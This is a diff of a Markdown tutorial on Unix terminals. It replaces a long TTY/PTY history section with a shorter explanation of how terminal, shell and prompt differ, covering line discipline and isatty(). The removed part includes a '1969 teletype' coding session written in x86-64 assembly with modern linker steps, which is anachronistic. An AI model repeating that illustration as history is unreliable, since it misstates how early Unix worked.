@@ -2753,1868 +2753,824 @@ Unix raw mode (vim, htop, etc.):
 
 The terminal you use today — whether a physical terminal or a terminal emulator like your Pop!_OS terminal — still uses this exact line discipline mechanism, inherited directly from the ASR-33 era.
 
-## TTY — From Hardware Teletype to Software Abstraction
+# Terminal, Shell and Prompt — The Complete Picture
 
-The journey from the physical ASR-33 to your terminal window today is one of the most instructive stories in Unix history. The same abstraction layer has been rebuilt three times — first for real hardware teletypes, then for glass terminals over serial lines, then for software emulators — and yet the interface your programs see has never changed.
+These three concepts appear together so consistently that almost everyone treats them as one thing. They are three completely separate components with distinct jobs, distinct histories, and no technical dependency on each other. Understanding the separation explains everything from how scripts work to why reverse shells are dumb to why SSH needs the `-t` flag.
 
 ---
 
-### Stage 1 — The Real Hardware TTY (1969)
-
-When Unix first ran on the PDP-7 and PDP-11 at Bell Labs, terminals were physical machines — ASR-33 teletypes and later glass-screen terminals like the DEC VT100 — connected to the computer via serial ports using the RS-232 electrical standard.
-
-Each serial port on the computer had a corresponding device file in the Unix filesystem:
+## The Definitions — Three Separate Things
 
 ```
-/dev/tty0    ← first serial port (first physical terminal)
-/dev/tty1    ← second serial port
-/dev/tty2    ← third serial port
-...
-```
+TERMINAL
+  A device (hardware or software) that handles input and output.
+  Its job: encode keystrokes as bytes, display received bytes as characters.
+  It does not interpret commands. It does not run programs.
+  It is a wire with a display attached.
 
-These were real hardware device files. Opening `/dev/tty0` gave you a file descriptor connected to whatever physical terminal was plugged into that serial port. Writing to it sent bytes down the wire. The terminal's hardware decoded those bytes and printed characters or moved the cursor.
+SHELL
+  A program that reads commands and executes them.
+  Its job: parse input, find programs, fork and exec them, handle pipes.
+  It does not care what is connected to its stdin/stdout.
+  It is a command interpreter.
 
-The kernel's **TTY driver** sat between the serial hardware and the rest of the system. It had two jobs:
-
-**On input** — receive raw bytes from the serial line as they arrived, run them through the line discipline, buffer them, process special characters (backspace, Ctrl-C, Ctrl-Z), and deliver complete lines to whatever process was reading from the terminal.
-
-**On output** — take bytes from programs writing to the terminal, optionally translate newlines to carriage-return-plus-line-feed pairs (because the physical terminal needed both), and send them down the serial wire.
-
-```
-Physical terminal (ASR-33 / VT100)
-         │ RS-232 serial wire
-         ▼
-┌─────────────────────────────────────────┐
-│           UART (hardware chip)          │  receives/sends electrical signals
-└─────────────────────────────────────────┘
-         │ interrupt when byte arrives
-         ▼
-┌─────────────────────────────────────────┐
-│         Serial port driver              │  handles the hardware interrupt
-└─────────────────────────────────────────┘
-         │
-         ▼
-┌─────────────────────────────────────────┐
-│          Line Discipline (N_TTY)        │  cooked mode / raw mode
-│  - buffers characters until Enter       │
-│  - processes backspace, Ctrl-C, Ctrl-Z  │
-│  - handles echo (typing shows on screen)│
-└─────────────────────────────────────────┘
-         │
-         ▼
-┌─────────────────────────────────────────┐
-│     Process reading /dev/tty0           │  your shell, your program
-│     read() blocks until line ready      │
-└─────────────────────────────────────────┘
+PROMPT
+  A string of text the shell prints before waiting for input.
+  Its job: signal to the user that the shell is ready.
+  It is a write() call inside the shell's read loop.
+  It is not a program, not a process, not a component.
+  It is output — bytes written to fd 1.
 ```
 
 ---
 
-### Stage 2 — The Virtual Console TTY (still hardware, no physical terminal)
+## Where Each One Came From
 
-As computers became more powerful, time-sharing meant many users needed simultaneous access. Physical serial ports were expensive and required running wires everywhere. Unix introduced **virtual consoles** — multiple independent terminal sessions multiplexed on a single screen and keyboard, switchable with key combinations.
+### The Terminal — ASR-33 Teletype, 1963
 
-On your Linux machine today, you have six virtual consoles available even without any graphical interface:
-
-```bash
-# Switch between virtual consoles
-Ctrl+Alt+F1    ← tty1 (often the graphical login)
-Ctrl+Alt+F2    ← tty2 (text login)
-Ctrl+Alt+F3    ← tty3 (text login)
-Ctrl+Alt+F4    ← tty4 (text login)
-Ctrl+Alt+F5    ← tty5 (text login)
-Ctrl+Alt+F6    ← tty6 (text login)
-```
-
-Each virtual console has a corresponding device:
+The terminal predates Unix. It was a physical machine — a typewriter connected to a computer by a serial cable. It had no CPU, no memory, no operating system. It encoded your keystrokes as ASCII bytes and sent them down the wire. It received bytes and hammered them onto paper.
 
 ```
-/dev/tty1    ← virtual console 1
-/dev/tty2    ← virtual console 2
-/dev/tty3    ← virtual console 3
-...
+1963 ASR-33 Teletype:
+  Keyboard -> encodes keystrokes as ASCII -> sends over RS-232 wire
+  Receives bytes from wire -> print head hammers ink onto paper roll
+
+What it knew: bytes
+What it did not know: commands, programs, files, anything else
 ```
 
-These are implemented entirely in the kernel. No physical serial port involved — the keyboard and display are shared hardware managed by the kernel's console subsystem, and each virtual console gets its own TTY driver instance with its own line discipline, its own input buffer, and its own foreground process group.
+In the 1970s, glass-screen terminals replaced teletypes. The paper roll became a screen. The print head became a cursor. The behaviour was identical: send bytes, display bytes.
 
----
+In the 1980s, personal computers had their own screens and keyboards. Physical terminals became unnecessary. Software **terminal emulators** were written — programs that behave exactly like a hardware terminal but run as a process. GNOME Terminal, iTerm2, Windows Terminal, Alacritty — all terminal emulators. They draw characters on screen and send keystrokes as bytes.
 
-### Stage 3 — The Pseudo-TTY (PTY) — The Key Innovation
-
-Here is the problem: once graphical interfaces arrived and people started running terminal emulators — programs like `xterm`, GNOME Terminal, your Pop!_OS terminal — there was no physical hardware for the terminal emulator to connect to. A terminal emulator is just a program that draws a window and processes keystrokes. It is not a serial port. It is not real hardware.
-
-The solution was the **pseudo-TTY** (PTY) — a software-only pair of connected file descriptors that perfectly emulates the two ends of a hardware TTY connection, entirely inside the kernel.
-
-A PTY has two ends:
-
-**The master side** (PTM) — owned by the terminal emulator. The emulator reads from it to get output from programs running inside, and writes to it to inject keystrokes.
-
-**The slave side** (PTS) — looks exactly like a real hardware TTY to everything on that side. The shell and all programs running in the terminal see a normal TTY device file like `/dev/pts/0`. They read from it, write to it, call `isatty()` on it — it behaves identically to a physical terminal.
+The connection between a terminal emulator and whatever runs inside it is made through a **PTY (pseudo-teletype)** — a software pair of file descriptors that perfectly emulates the two ends of a hardware serial connection. The PTY master fd is held by the terminal emulator. The PTY slave fd is given to whatever program runs inside (usually a shell).
 
 ```
-┌──────────────────────────────────────────────────────────┐
-│              Terminal Emulator (GNOME Terminal)           │
-│   draws window, handles fonts, processes keystrokes      │
-└──────────────────────────────────────────────────────────┘
-         │ reads output              │ writes keystrokes
-         │ (what to display)         │ (what user typed)
-         ▼                           ▼
-┌──────────────────────────────────────────────────────────┐
-│                  PTY Master (ptmx)                       │
-│              /dev/ptmx — kernel managed                  │
-├──────────────────────────────────────────────────────────┤
-│               Line Discipline (N_TTY)                    │
-│    same line discipline as real hardware TTY             │
-│    cooked/raw mode, Ctrl-C → SIGINT, echo, etc.         │
-├──────────────────────────────────────────────────────────┤
-│                  PTY Slave (pts)                         │
-│         /dev/pts/0, /dev/pts/1, /dev/pts/2 ...          │
-└──────────────────────────────────────────────────────────┘
-         │ reads stdin               │ writes stdout/stderr
-         ▼                           ▼
-┌──────────────────────────────────────────────────────────┐
-│              Shell (bash) and its child processes        │
-│   see /dev/pts/0 as their controlling terminal           │
-│   completely unaware they are talking to software        │
-└──────────────────────────────────────────────────────────┘
+Hardware era (1969):
+  ASR-33 teletype <-- RS-232 serial wire --> Shell on PDP-11 mainframe
+  Different rooms, different machines, just a wire
+
+Software era (today):
+  GNOME Terminal <-- PTY pair (kernel) --> bash
+  Same machine, both software, PTY replaces the wire
+
+The relationship is identical.
+The physics changed. The software model did not.
 ```
 
-The line discipline sits in the middle, between master and slave, exactly as it sat between the serial hardware and the shell in Stage 1. The shell cannot tell the difference. `bash` does not know whether its controlling terminal is a physical VT100 over RS-232 or a PTY pair whose master end is a window on a screen.
+### The Shell — Ken Thompson, 1969
 
----
+Ken Thompson wrote the first Unix shell (`sh`) in 1969. Its job was to read commands from wherever its stdin was connected and execute them. It was designed around the teletype model: read a line, parse it, run the program, print output, repeat.
 
-### How a Terminal Emulator Opens a PTY — Step by Step
+The shell's prompt existed from day one. On the original 1969 Unix the prompt was just `$` for regular users and `#` for root — a dollar sign and a space, nothing else.
 
-When you open a new terminal window, the terminal emulator does this:
+### The Prompt — A Variable, Not a Program
 
-```c
-/* Step 1: open the PTY master multiplexer */
-int master_fd = open("/dev/ptmx", O_RDWR);
-/* /dev/ptmx is the single device that allocates new PTY pairs */
-
-/* Step 2: grant and unlock the slave side */
-grantpt(master_fd);   /* set correct ownership on the slave device */
-unlockpt(master_fd);  /* allow the slave to be opened */
-
-/* Step 3: find out what slave device was allocated */
-char *slave_name = ptsname(master_fd);
-/* returns something like "/dev/pts/3" */
-
-/* Step 4: fork a child process for the shell */
-pid_t pid = fork();
-
-if (pid == 0) {
-    /* child — this becomes the shell */
-
-    /* create a new session — shell becomes session leader */
-    setsid();
-
-    /* open the slave side — this becomes the controlling terminal */
-    int slave_fd = open(slave_name, O_RDWR);
-
-    /* connect slave to stdin, stdout, stderr */
-    dup2(slave_fd, 0);
-    dup2(slave_fd, 1);
-    dup2(slave_fd, 2);
-    close(slave_fd);
-    close(master_fd);  /* child does not need master */
-
-    /* replace child with shell */
-    execve("/bin/bash", args, env);
-}
-
-/* parent — this is the terminal emulator */
-/* reads from master_fd to get shell output → renders in window */
-/* writes to master_fd to send keystrokes → shell receives as stdin */
-```
-
-From this point the terminal emulator sits in an event loop:
-
-- User types a key → emulator writes the byte to `master_fd` → line discipline processes it → shell reads it from its stdin (the slave)
-- Shell writes output → goes to slave → line discipline passes it through → emulator reads from `master_fd` → emulator renders the characters in its window
-
----
-
-### What isatty() Does and Why It Matters
-
-Many programs behave differently depending on whether their output is going to a real terminal or being redirected to a file or pipe. The `isatty()` function checks whether a file descriptor is connected to a TTY device:
-
-```c
-#include <unistd.h>
-
-if (isatty(STDOUT_FILENO)) {
-    /* output is going to a terminal — use colours, show progress bars */
-} else {
-    /* output is going to a file or pipe — plain text only */
-}
-```
-
-This is why `ls` shows coloured output in your terminal but plain text when you pipe it:
-
-```bash
-ls --color        # isatty(1) = true  → coloured output
-ls | cat          # isatty(1) = false → plain text, no colour codes
-```
-
-The PTY slave passes `isatty()` checks exactly as a physical terminal would. A pipe does not. This single check controls whether programs use terminal escape codes, ANSI colours, progress bars, cursor movement and interactive prompts.
-
----
-
-### The TTY Subsystem in the Linux Kernel
-
-The Linux kernel's TTY subsystem is layered:
+The prompt is stored in the environment variable `PS1` (Prompt String 1). Before every read, the shell evaluates PS1 and writes the result to stdout. That is the entire mechanism.
 
 ```
-─── TTY Subsystem Layers ───────────────────────────────────
+Shell's core loop (simplified):
 
-User space
-  Programs open /dev/ttyN, /dev/pts/N, /dev/ttyS0 etc.
-  All look identical from the program's perspective.
-
-─── TTY Core ───────────────────────────────────────────────
-  tty_struct — one per open TTY device
-  Manages the line discipline stack
-  Routes read/write between driver and line discipline
-
-─── Line Discipline (N_TTY is the default) ─────────────────
-  Cooked mode: buffers input line by line
-    - echo characters back as typed
-    - process backspace (erase last character)
-    - Ctrl-C → send SIGINT to foreground process group
-    - Ctrl-Z → send SIGTSTP (stop/suspend)
-    - Ctrl-D → signal end of input (EOF)
-    - Ctrl-\ → send SIGQUIT
-  Raw mode: pass every byte through immediately
-    - no buffering, no special character processing
-    - used by vim, htop, any full-screen program
-
-─── TTY Drivers ────────────────────────────────────────────
-  PTY driver     → pseudo-terminals (/dev/pts/N)
-  Serial driver  → real serial ports (/dev/ttyS0, ttyS1)
-  Console driver → virtual consoles (/dev/tty1 - tty6)
-  USB serial     → USB-to-serial adapters (/dev/ttyUSB0)
-```
-
----
-
-### Sessions, Process Groups and the Controlling Terminal
-
-The TTY subsystem does more than just transfer bytes. It is the mechanism that ties together job control — the ability to run multiple programs in one terminal, suspend them, background them, and bring them back.
-
-**Session** — a collection of process groups. Every session has a session leader (usually the shell). A session can have one controlling terminal.
-
-**Process group** — a collection of processes that receive signals together. When you run a pipeline `ls | grep foo`, both `ls` and `grep` are in the same process group. Pressing Ctrl-C sends SIGINT to the entire process group simultaneously.
-
-**Foreground process group** — the process group currently attached to the terminal. Only the foreground group can read from the terminal. If a background process tries to read from the terminal, the kernel sends it SIGTTIN which suspends it.
-
-**Controlling terminal** — the TTY device associated with a session. Signals generated by the terminal (Ctrl-C → SIGINT, Ctrl-Z → SIGTSTP) go to the foreground process group of the controlling terminal.
-
-```bash
-# See your current TTY device
-tty
-# /dev/pts/3
-
-# See all TTY sessions
-who
-
-# See which process group is in the foreground
-ps -o pid,pgid,sid,tty,comm
-
-# See file descriptors connecting your shell to its TTY
-ls -la /proc/$$/fd
-# fd 0, 1, 2 all point to /dev/pts/3
-```
-
----
-
-### SSH — A PTY Over a Network
-
-When you SSH into a remote server, the SSH daemon on the remote machine allocates a PTY for your session. The SSH protocol carries the raw byte streams between the PTY master on the remote server and your local terminal emulator. From your shell's perspective on the remote server, it has a perfectly normal controlling terminal at `/dev/pts/N`. It has no idea it is talking through an encrypted network connection.
-
-```
-Your machine                          Remote server
-┌──────────────┐                    ┌──────────────────────┐
-│ Terminal     │                    │ sshd process         │
-│ Emulator     │                    │                      │
-│  master_fd ──┼── SSH encrypted ───┼── master_fd          │
-│              │       network      │       │              │
-│              │                    │  Line Discipline      │
-│              │                    │       │              │
-│              │                    │  slave /dev/pts/2    │
-│              │                    │       │              │
-│              │                    │  bash (your shell)   │
-└──────────────┘                    └──────────────────────┘
-```
-
-This is also why `ssh -T` (no TTY allocation) is used for non-interactive commands — it skips the PTY allocation, which is faster and avoids the overhead of the line discipline when you just want to run a command and get output back.
-
----
-
-### Signals From the TTY — The Keyboard Shortcuts That Kill Processes
-
-Every keyboard shortcut that controls processes works through the TTY subsystem sending signals to the foreground process group:
-
-| Keystroke | TTY Action | Signal Sent | Default Effect |
-|---|---|---|---|
-| Ctrl-C | Line discipline intercepts | SIGINT | Terminate process |
-| Ctrl-Z | Line discipline intercepts | SIGTSTP | Suspend process (stop) |
-| Ctrl-\ | Line discipline intercepts | SIGQUIT | Terminate + core dump |
-| Ctrl-D | Line discipline sees EOF | (no signal) | Close stdin stream |
-| Ctrl-S | Line discipline intercepts | (flow control) | Pause output |
-| Ctrl-Q | Line discipline intercepts | (flow control) | Resume output |
-
-These are not the shell doing this — it is the TTY line discipline in the kernel responding to the incoming bytes before they even reach the shell.
-
-```bash
-# See and modify all TTY special character bindings
-stty -a
-
-# Example output snippet:
-# intr = ^C    ← Ctrl-C sends SIGINT
-# quit = ^\   ← Ctrl-\ sends SIGQUIT
-# erase = ^?   ← Backspace erases character
-# kill = ^U    ← Ctrl-U erases entire line
-# eof = ^D     ← Ctrl-D signals end of input
-# susp = ^Z    ← Ctrl-Z sends SIGTSTP
-
-# Put terminal in raw mode (what vim does)
-stty raw
-
-# Restore to normal cooked mode
-stty cooked
-
-# See what TTY your process is connected to
-tty
-
-# Disconnect a process from its controlling terminal
-nohup myprogram &
-```
-
----
-
-### Everything Connected — The Full TTY Picture
-
-```
-1963  ASR-33 physical teletype
-         │  mechanical byte stream model
-         ▼
-1969  Unix TTY driver for real serial hardware
-         │  line discipline born — cooked and raw mode
-         ▼
-1970s Virtual consoles — multiple sessions on one machine
-         │  /dev/tty1 through /dev/tty6
-         ▼
-1980s Pseudo-TTY invented — software emulates hardware TTY
-         │  /dev/ptmx master + /dev/pts/N slave
-         ▼
-1991  Linux implements full TTY subsystem
-         │  PTY driver, serial driver, console driver
-         │  N_TTY line discipline
-         │  session/process group/controlling terminal model
-         ▼
-Today Your Pop!_OS terminal window
-         │
-         ├── GNOME Terminal holds master_fd (/dev/ptmx)
-         ├── bash sees slave /dev/pts/3 as its controlling terminal
-         ├── line discipline sits between — cooked mode by default
-         ├── vim switches to raw mode when it starts
-         ├── Ctrl-C sends SIGINT via line discipline — not via bash
-         ├── SSH sessions get their own PTY pair on the remote server
-         └── every program that calls isatty() gets the correct answer
-```
-
-The physical teletype is gone. The abstraction it created has never changed.
-
----
-
-## How Code Was Actually Run on a Teletype — Paper, Assembly and the First Shell
-
-Understanding that the teletype was the only interface raises an immediate question: if the machine had no screen, how did anyone actually write and run code? What was the point of printing on paper? Did it have a shell? And what exactly is the difference between a shell and a prompt? These questions cut to the heart of how computing worked before screens existed.
-
----
-
-### Why Print on Paper at All?
-
-In 1969 when Unix was being written, **there was no screen.** The ASR-33 teletype was not a monitor with a keyboard — it was a typewriter connected to a computer. Paper was the only output medium available.
-
-When you ran a program, the results printed onto the paper roll. When you typed commands, they printed onto the paper too — this is called **echo**, and it survives in software today. The paper roll was your only record of what happened. When the session was done, you tore off the paper and took it with you.
-
-```
-Session on an ASR-33 in 1969:
-
-$ ls                          <- you typed this, it printed on paper
-Documents  programs  notes    <- computer responded, printed on paper
-$ cat notes                   <- you typed this
-meeting at 3pm tomorrow       <- printed on paper
-$ _                           <- waiting for next command
-
-Tear off the paper roll -> that is your entire session history.
-There is no scrollback, no history command, no screen to look at.
-```
-
-The paper was not a side effect. **The paper was the computer's entire user interface.** It was also your debugging output, your error log, your program results, and your permanent record of the session — all in one continuous roll.
-
----
-
-### How Assembly Code Was Written and Run on a Teletype
-
-Writing and assembling code on a 1969 Unix machine was a multi-step physical process — nothing like opening a text editor today. It involved paper tape, mechanical punches, and a lot of patience.
-
-#### The Paper Tape — Physical Storage
-
-The ASR-33 had a paper tape punch and reader built in. Paper tape was a strip of paper with holes punched in it — each row of holes across the width of the tape encoded one ASCII character in binary. A hole in a position meant 1, no hole meant 0.
-
-When you typed on the keyboard, two things happened simultaneously:
-
-```
-Keyboard keystroke
-      |
-      |---> print head hammers character onto paper roll  (you can read it)
-      |
-      '---> tape punch punches holes in paper tape         (machine readable)
-```
-
-The paper tape was your source file. Physical, tangible, holdable. You could carry it in your pocket. You could mail it to another institution. You could feed it back into the machine tomorrow and it would reproduce exactly what you typed.
-
-#### Step 1 — Type Your Assembly Source Code
-
-You sat at the teletype and typed your assembly source code. Every line printed on the paper roll and punched simultaneously onto the tape. If you made a mistake you could not erase it from the tape — the holes were already punched. The convention was to type a special character (originally `@`, later `#`) to signal "ignore this line" and retype it. The assembler knew to skip lines beginning with that character.
-
-```
-Paper roll output while typing source code:
-
-; add two numbers and return result
-_start:
-    mov eax, 5      ; first number
-    mvv ebx, 3@     <- typo — the @ cancels this line
-    mov ebx, 3      ; second number, retyped correctly
-    add eax, ebx
-    mov eax, 60
-    syscall
-```
-
-The tape now has holes for all of this including the cancelled line. The assembler handles the cancellation marker.
-
-#### Step 2 — Feed the Tape Into the Assembler
-
-You loaded the paper tape into the tape reader. The tape was pulled through mechanically — the reader detected holes either optically or with metal pins that dropped through the holes to complete a circuit. Each character's holes triggered the corresponding byte being sent into the computer.
-
-You ran the assembler at the shell prompt:
-
-```
-$ as                         <- run the assembler
-                             <- assembler reads source from tape reader
-                             <- tape is mechanically pulled through
-myprog:14: undefined symbol  <- error prints on paper roll
-myprog:22: undefined symbol  <- another error prints on paper roll
-$                            <- assembler finished with errors
-```
-
-You physically read the paper roll to find your errors. Line 14, undefined symbol. You look at your source listing — also on the paper roll from when you typed it — and find the problem.
-
-#### Step 3 — Fix Errors With ed
-
-If you needed to fix errors, you used `ed` — the only text editor Unix had in 1969. It still ships on every Linux and macOS machine today. `ed` operates on the line-by-line model with no visual display of the file — you address lines by number and give commands:
-
-```
-$ ed myprog.s           <- open the file
-847                     <- ed prints file size in bytes, nothing else
-14p                     <- print line 14
-    mov ax, fo          <- you see the typo
-14s/fo/foo/             <- substitute 'fo' with 'foo' on line 14
-14p                     <- verify the fix
-    mov ax, foo         <- correct
-w                       <- write the file
-847                     <- confirms bytes written
-q                       <- quit
-$
-```
-
-`ed` gives no visual feedback, no line numbers on screen, no syntax highlighting. You had to keep the entire file structure in your head. This is precisely why `vi` in 1976 was considered revolutionary — it showed you the actual file on screen as you edited it, one screenful at a time.
-
-#### Step 4 — Reassemble and Run
-
-Once errors were fixed, you ran the assembler again, feeding the corrected source. If successful, the assembler produced output — either a new paper tape punched with the machine code, or a binary file on disk if the machine had disk storage. You then ran it:
-
-```
-$ as myprog.s            <- assemble again, no errors this time
-$ ld myprog.o -o myprog  <- link into executable
-$ ./myprog               <- run it
-result: 8                <- output prints on paper roll
-$
-```
-
-The paper roll at the end of a coding session was a complete record: your source code as typed, all your errors, all your fixes, all your program output. You tore it off and kept it. It was your printout, your log, and your receipt simultaneously.
-
----
-
-### Did It Have a Shell and a Prompt?
-
-Yes — Unix had a shell from day one. Ken Thompson wrote the first Unix shell in 1969, simply called `sh`. The prompt was `$` for regular users and `#` for root — the exact same convention Linux uses 55 years later.
-
-But the shell and the prompt are two completely different things that happen to always appear together, which is why almost everyone confuses them.
-
----
-
-### The Shell — A Running Program
-
-The shell is a **program** — a fully running process with its own process ID sitting in memory. It is the program responsible for:
-
-- Reading your commands from standard input
-- Parsing them — splitting the command name from its arguments
-- Searching PATH directories to find the program you named
-- Creating a child process with fork()
-- Replacing that child with your program using exec()
-- Waiting for it to finish with wait()
-- Repeating from the beginning
-
-The shell is not special to the kernel. It is just another process. You can see it:
-
-```bash
-echo $$                    # print your shell's process ID
-ps -p $$                   # see the shell process
-cat /proc/$$/status        # see everything about it
-ls -la /proc/$$/fd         # see its open file descriptors
-```
-
-The shell handles an enormous amount beyond just running programs:
-
-```
-Variables:       NAME=leokadia
-Environment:     export PATH=/usr/local/bin:$PATH
-Redirection:     command > file   command < file   command 2> errors
-Pipes:           command1 | command2 | command3
-Globbing:        *.txt expands to all text files in current directory
-Job control:     Ctrl-Z suspends, fg brings back, bg sends to background
-Scripting:       loops, conditionals, functions, all in a text file
-History:         arrow keys recall previous commands
-Tab completion:  Tab completes filenames and command names
-```
-
-Shell lineage — every shell you have used descends from Thompson's original:
-
-```
-sh   (Ken Thompson, Bell Labs, 1969)      <- the original
-csh  (Bill Joy, Berkeley BSD, 1978)       <- introduced history and aliases
-ksh  (David Korn, Bell Labs, 1983)        <- added proper programming features
-bash (Brian Fox, GNU Project, 1989)       <- Bourne Again SHell, default on Linux
-zsh  (Paul Falstad, Princeton, 1990)      <- most feature-rich, default on macOS
-fish (2005)                               <- modern, user-friendly, different syntax
-```
-
----
-
-### The Prompt — Just a String of Text
-
-The prompt is **a string of text the shell prints** to signal it is ready for your next command. That is the entirety of what a prompt is. It is not a program. It is not a process. It is not a separate component. It is output — characters written to your terminal before the shell blocks waiting for input.
-
-The shell's core loop, simplified:
-
-```c
 while (1) {
-    write(stdout, PS1, strlen(PS1));     // PRINT THE PROMPT — this is all a prompt is
-    line = readline(stdin);              // block here, waiting for Enter
-    if (line is empty) continue;
+    if (interactive_mode) {
+        char *prompt = evaluate(PS1);        // evaluate the string
+        write(STDOUT_FILENO, prompt, ...);   // THIS IS THE PROMPT
+    }
+    line = read_line(STDIN_FILENO);          // block waiting for input
     tokens = parse(line);
     pid = fork();
-    if (pid == 0) {
-        execve(tokens[0], tokens, env);  // child becomes your program
-    }
-    waitpid(pid, &status, 0);           // shell waits for program to finish
-}                                        // loop — print prompt again
+    if (pid == 0) execve(tokens[0], tokens, env);
+    waitpid(pid, &status, 0);
+}
 ```
 
-The prompt string is stored in an environment variable called PS1 — Prompt String 1:
+The prompt is `write()`. Nothing more.
+
+---
+
+## The Line Discipline — What Sits Between Terminal and Shell
+
+The PTY is not a raw pipe. Between the master end (terminal emulator) and the slave end (shell) sits the **line discipline** — a kernel component that processes bytes in both directions.
+
+```
+User presses Ctrl-C:
+  Terminal emulator writes byte 0x03 to PTY master
+  Line discipline intercepts it
+  Line discipline sends SIGINT to the foreground process group
+  Shell or running program receives SIGINT
+  Shell does NOT see the 0x03 byte at all
+
+User presses Backspace:
+  Terminal emulator writes 0x7F to PTY master
+  Line discipline erases the last character from its input buffer
+  Shell does NOT see the backspace byte at all
+  Shell only receives the corrected line when Enter is pressed
+
+User types "ls" and presses Enter:
+  Terminal emulator writes 'l', 's', '\n' to PTY master
+  Line discipline buffers 'l', 's'
+  Line discipline delivers "ls\n" to PTY slave when '\n' arrives
+  Shell reads "ls\n" from its stdin (PTY slave)
+```
+
+This is called **cooked mode** or **canonical mode** — the line discipline cooks the raw byte stream into something useful before the shell sees it. Programs that need raw input (vim, htop) switch the line discipline to **raw mode** where every byte passes through immediately without buffering or interpretation.
+
+---
+
+## How the Terminal Decides to Be Interactive — isatty()
+
+The shell determines whether to be interactive by calling `isatty(0)` — checking whether file descriptor 0 (stdin) is connected to a TTY device.
+
+```c
+/* What bash does at startup */
+if (isatty(STDIN_FILENO)) {
+    interactive_mode = 1;   /* stdin is a PTY -> interactive */
+} else {
+    interactive_mode = 0;   /* file, pipe, socket -> script mode */
+}
+```
+
+`isatty()` is implemented as a single system call — `ioctl(fd, TCGETS, &termios)`. If the ioctl succeeds, the fd is a terminal. If it returns `ENOTTY` (Inappropriate ioctl for device), it is not.
 
 ```bash
-# See your current prompt definition
-echo $PS1
+# Prove isatty() with strace
+strace bash -c '' 2>&1 | grep TCGETS
+# ioctl(0, TCGETS, {B38400 opost isig icanon echo}) = 0
+# Return 0 = success = fd 0 IS a terminal -> interactive mode
 
-# On the original 1969 Unix — nothing else:
-PS1="$ "
+echo '' | strace bash -c '' 2>&1 | grep TCGETS
+# ioctl(0, TCGETS, 0x...) = -1 ENOTTY
+# ENOTTY = not a terminal -> script mode, no prompt
 
-# Common modern prompt:
-PS1="\u@\h:\w\$ "     # username@hostname:directory$
+# Prove with Python directly
+python3 -c "import os; print('TTY:', os.isatty(0))"
+# TTY: True  (connected to PTY)
 
-# PS2 — the continuation prompt when a command is incomplete
-echo $PS2             # usually >
+python3 -c "import os; print('TTY:', os.isatty(0))" < /dev/null
+# TTY: False (stdin is /dev/null)
 ```
 
 ---
 
-### The Precise Difference — Shell vs Prompt
+## Proving Each Component Is Independent
 
-```
-+-------------------------------------------------------------+
-|                    SHELL (bash process)                     |
-|                    PID 1205, running in memory              |
-|                                                             |
-|  Infinite loop:                                             |
-|    1. write(1, "$ ", 2)    <- prints THE PROMPT            |
-|    2. read(0, buf, ...)    <- blocks waiting for you        |
-|    3. parse the input                                       |
-|    4. fork() + exec()      <- runs your command             |
-|    5. wait()               <- waits for it to finish        |
-|    6. goto step 1          <- prints prompt again           |
-|                                                             |
-|  The prompt is step 1 only.                                 |
-|  It is a write() call inside the shell's loop.             |
-|  It has no existence independent of the shell.             |
-+-------------------------------------------------------------+
-```
+### Proof — Shell Without Terminal (7 Methods)
 
-The analogy: the shell is a waiter at a restaurant. The prompt is the waiter saying "ready to take your order." The waiter is a person who exists independently. "Ready to take your order" is just a sentence they say — it has no life apart from the waiter saying it. You can change what the waiter says (PS1="hello> "). You can make them say nothing (PS1=""). The waiter still exists and still takes orders either way.
-
-They are separable:
+A shell only needs file descriptors 0, 1 and 2. They can be anything.
 
 ```bash
-# Shell with no prompt — perfectly functional, just silent
-PS1=""
-# Shell is still there, still runs every command correctly
-
-# Text that looks like a prompt but has no shell behind it
-echo -n "$ "
-# Prints dollar sign and space — but nothing happens if you type
-# There is no shell listening
-```
-
-Scripts run with no prompt at all. When bash executes a script file it reads commands line by line and executes them — no prompt is ever printed because there is no human waiting to be told "I am ready."
-
----
-
-### On the Teletype in 1969 — What a Full Session Looked Like
-
-```
-login: leokadia                           <- printed on paper
-Password:                                 <- printed, input not echoed
-Last login: Mon Jan  5 09:12:00 1970     <- printed
-$ ls                                      <- shell printed '$', you typed 'ls'
-bin  dev  etc  tmp  usr                  <- ls output printed
-$ as                                      <- run assembler, reads from tape
-myprog:14: undefined symbol foo           <- error printed on paper
-$ ed myprog.s                            <- fix it with ed
-847
-14p
-    mov ax, fo
-14s/fo/foo/
-w
-847
-q
-$ as                                      <- reassemble
-$ ld myprog.o -o myprog                  <- link
-$ ./myprog                               <- run
-result: 8                                 <- your program output on paper
-$ logout
-```
-
-You tore off that strip of paper. That paper strip was your IDE, your terminal window, your debug output, your log file and your printout — all at once, permanently on paper.
-
----
-
-### How Modern Systems Implement the Same Thing
-
-The physical teletype is gone but every piece of its model survives in software:
-
-| 1969 Hardware | Modern Software Equivalent |
-|---|---|
-| Physical teletype machine | Terminal emulator (GNOME Terminal, iTerm2, Alacritty) |
-| RS-232 serial cable | PTY pair — master/slave file descriptors in kernel |
-| Paper roll output | Scrollback buffer in terminal emulator memory |
-| Paper tape storage | Source files on SSD or HDD |
-| Echo (characters print as typed) | N_TTY line discipline echoes bytes back to terminal |
-| Carriage return + line feed | Newline — kernel TTY driver translates |
-| @ or # to cancel a line | Backspace — line discipline erases from buffer |
-| Ctrl-C break key on teletype | SIGINT via line discipline to foreground process group |
-| Paper tape punch | Your keystrokes going to PTY master fd |
-| Paper tape reader | Program's stdin via PTY slave |
-| Print head hammering ink | Terminal emulator rendering characters in window |
-
-The path from your keyboard to your shell today:
-
-```
-You press a key
-         |
-         v
-Keyboard hardware interrupt -> kernel keyboard driver
-         |
-         v
-Input event -> terminal emulator receives it (X11 or Wayland)
-         |
-         v
-Terminal emulator writes the byte to PTY master fd
-         |
-         v
-Kernel PTY driver receives byte on master side
-         |
-         v
-N_TTY line discipline processes it:
-  - Ctrl-C?     -> send SIGINT to foreground process group
-  - Ctrl-Z?     -> send SIGTSTP (suspend)
-  - Backspace?  -> erase last byte from input buffer
-  - Enter?      -> deliver buffered line to reader
-  - Otherwise   -> add to input buffer, echo back to master
-         |
-         v
-Shell's read() on PTY slave unblocks — receives the line
-         |
-         v
-Shell parses the line, fork() + exec() -> your program runs
-         |
-         v
-Program writes output to stdout (PTY slave)
-         |
-         v
-N_TTY passes output through to PTY master
-         |
-         v
-Terminal emulator reads from PTY master
-         |
-         v
-Terminal emulator renders characters in window on screen
-
-The paper roll is gone.
-Everything else is identical to 1969.
-```
-
